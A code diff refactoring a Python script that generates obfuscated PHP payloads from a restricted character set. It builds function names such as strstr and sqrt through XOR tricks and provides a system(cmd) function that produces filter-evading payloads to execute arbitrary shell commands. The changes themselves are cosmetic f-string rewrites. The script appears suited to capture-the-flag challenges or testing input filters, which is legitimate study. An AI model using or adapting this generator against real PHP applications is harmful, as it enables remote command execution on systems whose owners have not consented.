@@ -21,7 +21,7 @@ def expand():
 
 # Given an input string, will try to return the encoded form of that string.
 def stringfor(s):
-    return ".".join("(" + cs[c] + ")" for c in s)
+    return ".".join(f"({cs[c]})" for c in s)
 
 
 # Generate all the characters we can.
@@ -29,7 +29,6 @@ def build_cs():
     # We get 7 characters for free
     for c in "[(,.^)]":
         cs[c] = f"'{c}'"
-    expand()
 
     # 'strstr' === '())())'^'[][[]['
     p_strstr = "'())())'^'[][[]['"
@@ -38,28 +37,20 @@ def build_cs():
     p_sqrt = "'(,))'^'[][]'"
 
     # False === ('strstr')('.',',')
-    p_false = "(" + p_strstr + ")('.',',')"
+    p_false = f"({p_strstr})('.',',')"
 
     # 'k' === ((false^false).'.')^'['
-    cs["k"] = "((" + p_false + "^" + p_false + ").'.')^'['"
+    cs["k"] = f"(({p_false}^{p_false}).'.')^'['"
     expand()
 
     # '9' === (('sqrt')('5').'.')['12']
-    cs["9"] = (
-        "(("
-        + p_sqrt
-        + ")("
-        + stringfor("5")
-        + ").'.')["
-        + stringfor("12")
-        + "]"
-    )
+    cs["9"] = f"(({p_sqrt})({stringfor('5')}).'.')[{stringfor('12')}]"
     expand()
 
 
 # Given cmd, generate a payload that executes system(cmd)
 def system(cmd):
-    return "(" + stringfor("system") + ")(" + stringfor(cmd) + ")"
+    return f"({stringfor('system')})({stringfor(cmd)})"
 
 
 cs = dict()
